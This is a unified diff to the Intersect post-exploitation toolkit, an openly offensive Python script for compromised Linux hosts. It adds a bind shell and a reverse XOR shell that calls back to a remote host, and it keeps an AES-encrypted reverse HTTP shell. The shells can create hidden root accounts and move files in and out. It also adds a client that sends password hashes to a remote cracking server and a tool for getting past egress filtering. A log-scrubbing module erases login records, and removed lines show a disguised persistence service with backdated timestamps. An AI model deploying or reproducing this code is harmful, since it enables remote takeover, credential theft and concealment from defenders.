@@ -66,14 +66,14 @@ def environment():
     if os.geteuid() != 0:
         print("[*] Intersect should be executed as a root user. If you are not root, Intersect can check for privilege escalation vulnerabilites.")
         print("[*] Enter '1' to check for possible vulnerabilities (privesc module must be loaded). Enter '99' to exit without checking.")
-	option = raw_input("=> " )
+        option = raw_input("=> " )
         if option == '1':
             privesc()
             sys.exit()
         else:
             sys.exit()
     else:
-         pass
+        pass
 
     signal.signal(signal.SIGINT, signalHandler)
 
@@ -90,7 +90,7 @@ def environment():
 
     print "[!] Reports will be saved in: %s" % Temp_Dir
 
-  
+
 def signalHandler(signal, frame):
     print("[!] Ctrl-C caught, shutting down now");
     Shutdown()
@@ -99,13 +99,109 @@ def signalHandler(signal, frame):
 def Shutdown():
     if not os.listdir(Temp_Dir):
         os.rmdir(Temp_Dir)
+    sys.exit()
 
 def whereis(program):
     for path in os.environ.get('PATH', '').split(':'):
-       if os.path.exists(os.path.join(path, program)) and \
+        if os.path.exists(os.path.join(path, program)) and \
             not os.path.isdir(os.path.join(path, program)):
                 return os.path.join(path, program)
     return None
+
+
+def copy2temp(filename, subdir=""):
+    if os.path.exists(filename) is True: 
+        pass
+        if subdir == "" is True:
+            shutil.copy2(filename, Temp_Dir)
+        else:
+            if os.path.exists(Temp_Dir+"/"+subdir) is True:
+                subdir = (Temp_Dir+"/"+subdir)
+                shutil.copy2(filename, subdir)
+            elif os.path.exists(subdir) is True:
+                shutil.copy2(filename, subdir)
+            else:
+                subdir = (Temp_Dir+"/"+subdir)
+                os.mkdir(subdir)
+                shutil.copy2(filename, subdir)
+    else:
+        pass
+
+def write2file(filename, text):
+    if os.path.exists(filename) is True:
+        target = open(filename, "a")
+        target.write(text)
+        target.close()
+    else:
+        pass
+
+def writenew(filename, content):
+    new = open(filename, "a")
+    new.write(content)
+    new.close()
+
+def file2file(readfile, writefile):
+    if os.path.exists(readfile) is True:
+        readfile = open(readfile)
+        if os.path.exists(writefile) is True:
+            writefile = open(writefile, "a")
+            for lines in readfile.readlines():
+                writefile.write(lines)
+            writefile.close()
+            readfile.close()
+        else:
+            readfile.close()
+    else:
+        pass
+			
+def maketemp(subdir):
+    moddir = (Temp_Dir+"/"+subdir)
+    if os.path.exists(moddir) is False:
+        os.mkdir(moddir)
+    else:
+        pass
+
+def users():
+    global userlist
+    userlist = []
+    passwd = open('/etc/passwd')
+    for line in passwd:
+        fields = line.split(':')
+        uid = int(fields[2])
+        if uid > 500 and uid < 32328:
+            userlist.append(fields[0])
+
+def combinefiles(newfile, filelist):
+    content = ''
+    for f in filelist:
+        if os.path.exists(f) is True:
+            content = content + '\n' + open(f).read()
+            open(newfile,'wb').write(content)
+        else:
+            pass
+
+def tardir(name, directory):
+    tar = tarfile.open("%s.tar.gz", "w:gz" % name)
+    if os.path.exists(directory) is True:
+        tar.add("%s/" % directory)
+        print("[+] %s added to %s.tar.gz" % (name, directory))
+        tar.close()
+    else:
+        print("[!] Could not find directory %s " % directory)
+        tar.close()
+
+def tarlist(name, filelist):
+    tar = tarfile.open("%s.tar.gz" % name, "w:gz")
+    for files in filelist:
+        if os.path.exists(files) is True:
+            tar.add(files)
+        else:
+            print("[!] %s not found. Skipping.." % files)
+    tar.close()
+
+    print("[+] %s.tar.gz file created!" % name)
+
+
 
 
 def globalvars():
@@ -116,16 +212,215 @@ def globalvars():
     global PKEY
     global modList
 
-    modList = ['aeshttp', 'xorshell', 'network', 'persistent', 'scrub']
+    modList = ['bshell', 'xmlcrack', 'egressbuster', 'aeshttp', 'reversexor', 'xorshell', 'scrub']
     PORT = 4444
     RHOST = '192.168.1.4'
-    RPORT = 5555
-    PPORT = 8080
-    PKEY = 'QXKISJFTAA'
+    RPORT = 6666
+    PPORT = 8888
+    PKEY = 'JFDSISXX'
 
 
-# Reverse HTTP AES shell. Opens a shell to your remote host and uses AES encryption to protect the data being transmitted over the wire. Written by ReL1K.
+def bshell():
+    '''
+    @description: Starts a TCP bind shell on the target system. Interactive shell with download/upload, cd and ability to execute other modules remotely."
+    @author: ohdae [bindshell@live.com]
+    @short: TCP bindshell
+    '''
+    HOST = ''
+    socksize = 4096
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+    try:
+        server.bind((HOST, PORT))
+        server.listen(10)
+        conn, addr = server.accept()
+        conn.send("\nIntersect "+str(os.getcwd())+" => ")
+    except:
+        print "[!] Connection closed."
+        sys.exit(2)
+    
+    while True:
+        cmd = conn.recv(socksize)
+        proc = Popen(cmd,
+             shell=True,
+             stdout=PIPE,
+             stderr=PIPE,
+             stdin=PIPE,
+             )
+        stdout, stderr = proc.communicate()
+
+        if cmd.startswith('cd'):
+            destination = cmd[3:].replace('\n','')
+            if os.path.isdir(destination):
+                os.chdir(destination)
+                conn.send("\nIntersect "+str(os.getcwd())+" => ")
+            else:
+                conn.send("[!] Directory does not exist") 
+                conn.send("\nIntersect "+str(os.getcwd())+" => ")
+
+        elif cmd.startswith('adduser'):
+            strip = cmd.split(" ")
+            acct = strip[1]
+            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
+            conn.send("[+] Root account " + acct + " has been created.") 
+
+        elif cmd.startswith('upload'):
+            getname = cmd.split(" ")
+            rem_file = getname[1]
+            filename = rem_file.replace("/","_")
+            filedata = conn.recv(socksize)
+            newfile = file(filename, "wb")
+            newfile.write(filedata)
+            newfile.close()
+            if os.path.isfile(filename):
+                conn.send("[+] File upload complete!")
+            if not os.path.isfile(filename):
+                conn.send("[!] File upload failed! Please try again")
+
+        elif cmd.startswith('download'):
+            getname = cmd.split(" ")
+            loc_file = getname[1]
+            if os.path.exists(loc_file) is True:
+                sendfile = open(loc_file, "r")
+                filedata = sendfile.read()
+                sendfile.close()
+                conn.sendall(filedata)
+            else:
+                conn.send("[+] File not found!")
+
+        elif cmd.startswith("rebootsys"):
+            conn.send("[!] Server system is going down for a reboot!")
+            os.system("shutdown -h now")
+
+        elif cmd == ("extask"):
+            conn.send(str(modList))
+            conn.send("\nIntersect "+str(os.getcwd())+" => ")
+
+        elif cmd.startswith("extask"):
+            getname = cmd.split(" ")
+            modname = getname[1]
+            if modname in modList is False:
+                conn.send("[!] Module not loaded!")
+            else:
+                conn.send("[+] Executing %s " % modname)
+                execmod = modname+"()"
+                execmod
+
+        elif cmd == ('killme'):
+            conn.send("[!] Shutting down shell!\n")
+            conn.close()
+            sys.exit(0)
+
+        elif proc:
+            conn.sendall( stdout )
+            conn.send("\nIntersect "+str(os.getcwd())+" => ")
+
+
+def xmlcrack():
+    '''
+    @description: Sends hash list to remote XMLRPC server for cracking. Crackserver.py must be running on the remote host.
+    @author: original code by Stephen Haywood aka averagesecurityguy
+    @short: xmlrpc crack client (-x filename hashtype)
+    '''
+    if len(sys.argv) <=3:
+        print("[!] Must specify a filename and hashtype!")
+        sys.exit()
+
+    import time
+    try:
+        import xmlrpclib
+    except ImportError:
+        print("[!] Python library XMLRPC is not installed!")
+        sys.exit(0)    
+
+    data = []
+    filename = sys.argv[2]
+    hashtype = sys.argv[3]
+
+    try:
+    #Open the hash file and convert it to an array before sending it in the
+    #XMLRPC request.
+        file = open(filename, 'rb')
+        for line in file:
+            data.append(line.rstrip('\r\n'))
+        file.close()
+    except Exception, err:
+        print "Error opening file " + filename + ": " + str(err)
+
+    # Open connection to xmlrpc server
+    server = ("http://"+RHOST+":"+str(RPORT))
+    try:
+        s = xmlrpclib.ServerProxy(server)
+    except:
+        print "Error opening connection to server " + server + ": " + str(err)
+
+    # Send request to server and receive ID
+    id, msg = s.crack(data, hashtype)
+
+    if id == 0:
+        print msg
+    else:
+        # Poll server for completion status and results using ID.
+        complete = False
+        wait = 10
+        while True:
+            time.sleep(wait)
+            complete, results = s.results(id)
+            if results != []:
+                for r in results:
+                    print r.rstrip('\r\n')
+            if complete: break    
+
+def egressbuster():
+    '''
+    @description: Checks a range of ports to find available outbound ports. used to break egress filters.
+    @author: original code by David Kennedy aka ReL1K
+    @short: finds open outbound ports
+    '''
+    if len(sys.argv) <=2:
+        print("[!] Must specify a port-range!")
+        sys.exit()
+
+    portrange = sys.argv[2]
+    portrange = portrange.split("-")
+    lowport = int(portrange[0])
+    highport = int(portrange[1])        
+    base_port = int(lowport)-1
+    end_port = int(highport)
+
+    print "Sending packets to egress listener..."
+
+    while 1:
+        base_port = base_port + 1
+        thread.start_new_thread(start_socket, (RHOST,base_port))
+
+        time.sleep(0.02)
+        
+        if base_port == end_port:
+                break
+
+    print "All packets have been sent"
+
+
+def start_socket(RHOST,base_port):
+    try:  
+        sockobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sockobj.connect((RHOST, base_port))
+        sockobj.send(str(base_port))
+        sockobj.close()
+    except Exception, e:
+        print e
+        # pass through, ports closed
+        pass
+
+
+
 def aeshttp():
+    '''
+    @description: Starts a reverse HTTP shell with AES encryption that will connect back to a remote host.
+    @short: reverse AES HTTP shell
+    @author: original code by David Kennedy aka ReL1k
+    '''
     import httplib
     import urllib
     try:
@@ -146,35 +441,150 @@ def aeshttp():
 
     while 1:
 
-	    req = urllib2.Request('http://%s:%s' % (RHOST,RPORT))
-	    message = urllib2.urlopen(req)
-	    message = base64.b64decode(message.read())
-	    message = DecodeAES(cipher, message)
+        req = urllib2.Request('http://%s:%s' % (RHOST,RPORT))
+        message = urllib2.urlopen(req)
+        message = base64.b64decode(message.read())
+        message = DecodeAES(cipher, message)
 
-	    if message == "killme":
-                sys.exit()
-            if message.startswith("cd"):
-	        destination = message[3:].replace('\n','')
-                if os.path.isdir(destination):
-	            os.chdir(destination)
-                else:
-	            pass
+        if message == "killme":
+            sys.exit()
 
-
-	    proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
-	    data = proc.stdout.read() + proc.stderr.read()
-   	    data = EncodeAES(cipher, data)
-    	    data = base64.b64encode(data)
-    	    data = urllib.urlencode({'cmd': '%s'}) % (data)
-    	    h = httplib.HTTPConnection('%s:%s' % (RHOST,RPORT))
-    	    headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)","Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
-            h.request('POST', '/index.aspx', data, headers)
+        if message.startswith("cd"):
+            destination = message[3:].replace('\n','')
+            if os.path.isdir(destination):
+                os.chdir(destination)
+            else:
+                pass
 
 
+        proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-# Starts a XOR ciphered bind shell on the remote system. Provides extra security. Offers you the ability to run Intersect tasks via the remote shell.
+        data = proc.stdout.read() + proc.stderr.read()
+        data = EncodeAES(cipher, data)
+        data = base64.b64encode(data)
+        data = urllib.urlencode({'cmd': '%s'}) % (data)
+        h = httplib.HTTPConnection('%s:%s' % (RHOST,RPORT))
+        headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)","Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
+        h.request('POST', '/index.aspx', data, headers)
+
+
+
 def xor(string, key):
+    '''
+    @description: Opens a reverse XOR ciphered TCP shell to a remote host. Interactive shell with download/upload and remote Intersect module execution.
+    @author: ohdae [bindshell@live.com]
+    @short: reverse XOR TCP shell
+    '''
+    data = ''
+    for char in string:
+        for ch in key:
+            char = chr(ord(char) ^ ord(ch))
+        data += char
+    return data
+  
+
+def reversexor():
+    socksize = 4096
+    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    try:
+        conn.connect((RHOST, RPORT))
+        conn.send(xor("[+] New connection established!", PKEY))
+        conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+    except:
+        print("[!] Connection error!")
+        sys.exit(2)
+
+    while True:
+        cmd = conn.recv(socksize)
+        cmd2 = xor(cmd, PKEY)
+        proc = Popen(cmd2,
+             shell=True,
+             stdout=PIPE,
+             stderr=PIPE,
+             stdin=PIPE,
+             )
+        stdout, stderr = proc.communicate()
+
+        if cmd2.startswith('cd'):
+            destination = cmd2[3:].replace('\n','')
+            if os.path.isdir(destination):
+                os.chdir(destination)
+                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+            elif os.path.isdir(os.getcwd()+destination):
+                os.chdir(os.getcwd()+destination)
+                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+            else:
+                conn.send(xor("[!] Directory does not exist", PKEY)) 
+                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+
+        elif cmd2.startswith('adduser'):
+            strip = cmd.split(" ")
+            acct = strip[1]
+            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
+            conn.send(xor("[+] Root account " + acct + " has been created.", PKEY))
+
+        elif cmd2.startswith('upload'):
+            getname = cmd2.split(" ")
+            rem_file = getname[1]
+            filename = rem_file.replace("/","_")
+            data = conn.recv(socksize)
+            filedata = xor(data, PKEY)
+            newfile = file(filename, "wb")
+            newfile.write(filedata)
+            newfile.close()
+            if os.path.isfile(filename):
+                conn.send(xor("[+] File upload complete!", PKEY))
+            if not os.path.isfile(filename):
+                conn.send(xor("[!] File upload failed! Please try again", PKEY))
+
+        elif cmd2.startswith('download'):
+            getname = cmd2.split(" ")
+            loc_file = getname[1]
+            if os.path.exists(loc_file) is True:
+                sendfile = open(loc_file, "r")
+                filedata = sendfile.read()
+                sendfile.close()
+                senddata = xor(filedata, PKEY)
+                conn.sendall(senddata)
+            else:
+                conn.send(xor("[+] File not found!", PKEY))
+
+        elif cmd2.startswith("rebootsys"):
+            conn.send(xor("[!] Server system is going down for a reboot!", PKEY))
+            os.system("shutdown -h now")
+ 
+        elif cmd2 == ("extask"):
+            conn.send(xor(str(modList), PKEY))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+
+        elif cmd2.startswith("extask"):
+            getname = cmd.split(" ")
+            modname = getname[1]
+            if modname in modList is False:
+                conn.send(xor("[!] Module not loaded!", PKEY))
+            else:
+                conn.send(xor("[+] Executing %s " % modname, PKEY))
+                execmod = modname+"()"
+                execmod
+
+        elif cmd2 == ('killme'):
+            conn.send(xor("[!] Shutting down shell!\n", PKEY))
+            conn.close()
+            sys.exit(0)
+
+        elif proc:
+            conn.send(xor( stdout , PKEY))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+
+
+
+def xor(string, key):
+    '''
+    @description: Starts a XOR ciphered TCP bindshell on the target. Interactive shell with download/upload and remote Intersect module execution.
+    @author: ohdae [bindshell@live.com]
+    @short: XOR TCP bindshell
+    '''
     data = ''
     for char in string:
         for ch in key:
@@ -209,26 +619,25 @@ def xorshell():
              stdin=PIPE,
              )
         stdout, stderr = proc.communicate()
+
         if cmd2.startswith('cd'):
-	    destination = cmd2[3:].replace('\n','')
+            destination = cmd2[3:].replace('\n','')
             if os.path.isdir(destination):
-	        os.chdir(destination)
-	        conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+                os.chdir(destination)
+                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
             elif os.path.isdir(os.getcwd()+destination):
                 os.chdir(os.getcwd()+destination)
                 conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
             else:
-	        conn.send(xor("[!] Directory does not exist", PKEY)) 
-	        conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+                conn.send(xor("[!] Directory does not exist", PKEY)) 
+                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+
         elif cmd2.startswith('adduser'):
             strip = cmd.split(" ")
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
             conn.send(xor("[+] Root account " + acct + " has been created.\n", PKEY)) 
-        elif cmd2 == ("httproxy"):
-	    httpd = SocketServer.ForkingTCPServer(('', PPORT), Proxy)
-            conn.send(xor("[+] Serving HTTP proxy on port "+ PPORT +"", PKEY))
-	    httpd.serve_forever()  
+
         elif cmd2.startswith('upload'):
             getname = cmd2.split(" ")
             rem_file = getname[1]
@@ -242,6 +651,7 @@ def xorshell():
                 conn.send(xor("[+] File upload complete!", PKEY))
             if not os.path.isfile(filename):
                 conn.send(xor("[!] File upload failed! Please try again", PKEY))
+
         elif cmd2.startswith('download'):
             getname = cmd2.split(" ")
             loc_file = getname[1]
@@ -253,42 +663,30 @@ def xorshell():
                 conn.sendall(senddata)
             else:
                 conn.send(xor("[+] File not found!", PKEY))
+
         elif cmd2.startswith("rebootsys"):
             conn.send(xor("[!] Server system is going down for a reboot!", PKEY))
             os.system("shutdown -h now")
-        elif cmd2 == ("extask osinfo"):
-            Gather_OS()
-            conn.send(xor("\n[+] OS Info Gathering complete.", PKEY))
-            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
+
+        elif cmd2 == ("extask"):
+            conn.send(xor(str(modList), PKEY))
             conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
-        elif cmd2 == ("extask network"):
-            NetworkInfo()
-            conn.send(xor("\n[+] Network Gather complete.", PKEY))
-            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
-            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
-        elif cmd2 == ("extask credentials"):
-            GetCredentials()
-            conn.send(xor("\n[+] Credentials Gather complete.", PKEY))
-            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
-            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
-        elif cmd2 == ("extask livehosts"):
-            NetworkMap()
-            conn.send(xor("\n[+] Network Map complete.", PKEY))
-            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
-            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
-        elif cmd2 == ("extask findextras"):
-            FindExtras()
-            conn.send(xor("\n[+] Extras Gather complete.", PKEY))
-            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
-            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
-        elif cmd2 == ("extask scrub"):
-            ScrubLog()
-            conn.send(xor("\n[+] Scrubbing complete.", PKEY))
-            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+
+        elif cmd2.startswith("extask"):
+            getname = cmd.split(" ")
+            modname = getname[1]
+            if modname in modList is False:
+                conn.send(xor("[!] Module not loaded!", PKEY))
+            else:
+                conn.send(xor("[+] Executing %s " % modname, PKEY))
+                execmod = modname+"()"
+                execmod
+
         elif cmd2 == ('killme'):
             conn.send(xor("[!] Shutting down shell!\n", PKEY))
             conn.close()
             sys.exit(0)
+
         elif proc:
             conn.send(xor( stdout , PKEY))
             conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
@@ -296,117 +694,12 @@ def xorshell():
 
 
 
-# Finds and saves network information such as listening ports, firewall rules, DNS configurations, network interfaces and active connections.
-def network():
-    print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
-    os.mkdir(Temp_Dir+"/network")
-    networkdir = (Temp_Dir+"/network")
-    os.chdir(networkdir) 
-
-    proc = Popen('netstat --tcp --listening',
-         shell=True,
-         stdout=PIPE,
-         )
-    output = proc.communicate()[0]
-
-    file = open("nstat.txt","a")
-    for items in output:
-        file.write(items),
-    file.close() 
-
-    os.system("lsof -nPi > lsof.txt")
-    ports = ["nstat.txt","lsof.txt"]
-    content = ''
-    for f in ports:
-        content = content + '\n' + open(f).read()
-    open('Connections.txt','wb').write(content)
-    os.system("rm nstat.txt lsof.txt")
-    if whereis('iptables') is not None:
-        os.system("iptables -L -n > iptablesLN.txt") 
-        os.system("iptables-save > iptables_save.txt")
-    else:
-        pass
-
-    os.system("ifconfig -a > ifconfig.txt")
-
-
-    if distro == "ubuntu" or distro2 == "Ubuntu" is True:
-        os.system("hostname -I > IPAddresses.txt")
-    else:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("google.com",80))
-        localIP = (s.getsockname()[0])
-        s.close()
-        splitIP = localIP.split('.')
-        splitIP[3:] = (['0/24'])
-        IPRange = ".".join(splitIP)
-        externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
-        file = open("IPAddresses.txt", "a")
-        file.write("External IP Address: " + externalIP)
-        file.write("Internal IP Address: " + localIP)
-        file.write("Internal IP Range: " + IPRange)
-        file.close
-   
-    os.system("hostname -f > hostname.txt")
-   
-    netfiles = ["IPAddresses.txt","hostname.txt","ifconfig.txt"]
-    content = ''
-    for f in netfiles:
-        content = content + '\n' + open(f).read()
-    open('NetworkInfo.txt','wb').write(content)
-    os.system("rm IPAddresses.txt hostname.txt ifconfig.txt")
-
-    network = [ "/etc/hosts.deny", "/etc/hosts.allow", "/etc/inetd.conf", "/etc/host.conf", "/etc/resolv.conf" ]
-    for x in network:
-        if os.path.exists(x) is True:
-            shutil.copy2(x, networkdir)
-   
-
-# Lets you install an Intersect shell as a persistent service on the target. You must define your shell type and file location when prompted.
-def persistent():
-	header = " => "
-	print("Full path of your Intersect script: ")
-	currentfile = raw_input("%s " % (header))
-
-	if os.path.exists(currentfile) is True:
-		shutil.copy2(currentfile, "/etc/default/sysupd")
-	else:
-		print("[!] Incorrect file path, Try again!")
-		persistent()
-
-
-	print("Specify which shell to use: ")
-	shell = raw_input("%s " % (header))
-
-	if shell in modList is False:
-		print("[!] Shell module not loaded!")
-		persistent()
-	else:
-		if os.path.isdir("/etc/init.d"):
-			serwrite = open("/etc/init.d/sysupd", "w")
-			serwrite.write("#!/bin/sh\ncd /etc/default/\nsudo python sysupd --%s &" % shell)
-			serwrite.close()
-			os.system("chmod +x /etc/init.d/sysupd")
-			os.system("update-rc.d sysupd defaults")
-			print("[+] Persistent service installed.")
-			print("[+] Modifying touch times on shell files...")
-			os.system("touch -t 200512311216 /etc/default/sysupd")
-			os.system("touch -t 200512311216 /etc/init.d/sysupd")
-			print("[+] Attempting to lock down shell files...")
-			if whereis('chattr') is not None:
-				os.system("chattr +i /etc/default/sysupd")
-				os.system("chattr +i /etc/init.d/sysupd")
-			else:
-				print("[!] Chattr not found. Could not lock files.")
-
-			print("[+] Persistent shell successfull! System will now start your shell as a background process on every reboot.")
-
-
-
-
-
-# Attempts to remove the current username and IP address from log files such as utmp, wtmp and lastlog. Intrusive method.
-def scrub():  
+def scrub():
+  '''
+  @description: Attempts to remove the currently logged in username and IP address from utmp, wtmp and lastlog. Intrusive method.
+  @author: ohdae [bindshell@live.com]
+  @short: cleans utmp, wtmp and lastlog
+  '''
   try:
     Current_User = os.getlogin()
   except OSError:
@@ -469,15 +762,17 @@ def usage():
     print('   intersect 2.5 | custom version     ')
     print('      http://bindshell.it.cx | ohdae')
     print(' Modules:')
-    print('     -a   --aeshttp')
-    print('     -x   --xorshell')
-    print('     -n   --network')
-    print('     -p   --persistent')
-    print('     -s   --scrub')
+    print('    -b    --bshell        TCP bindshell')
+    print('    -x    --xmlcrack        xmlrpc crack client (-x filename hashtype)')
+    print('    -e    --egressbuster        finds open outbound ports')
+    print('    -a    --aeshttp        reverse AES HTTP shell')
+    print('    -r    --reversexor        reverse XOR TCP shell')
+    print('    -x    --xorshell        XOR TCP bindshell')
+    print('    -s    --scrub        cleans utmp, wtmp and lastlog')
 
 def main(argv):
     try:
-        opts, args = getopt.getopt(sys.argv[1:], 'axnps', ['aeshttp', 'xorshell', 'network', 'persistent', 'scrub', 'help'])
+        opts, args = getopt.getopt(sys.argv[1:], 'bxearxs', ['bshell', 'xmlcrack', 'egressbuster', 'aeshttp', 'reversexor', 'xorshell', 'scrub', 'help'])
     except getopt.GetoptError, err:
         print str(err)
         Shutdown()
@@ -486,14 +781,18 @@ def main(argv):
             usage()
             Shutdown()
             sys.exit(2)
+        elif o in ('-b', '--bshell'):
+            bshell()
+        elif o in ('-x', '--xmlcrack'):
+            xmlcrack()
+        elif o in ('-e', '--egressbuster'):
+            egressbuster()
         elif o in ('-a', '--aeshttp'):
             aeshttp()
+        elif o in ('-r', '--reversexor'):
+            reversexor()
         elif o in ('-x', '--xorshell'):
             xorshell()
-        elif o in ('-n', '--network'):
-            network()
-        elif o in ('-p', '--persistent'):
-            persistent()
         elif o in ('-s', '--scrub'):
             scrub()
         else:
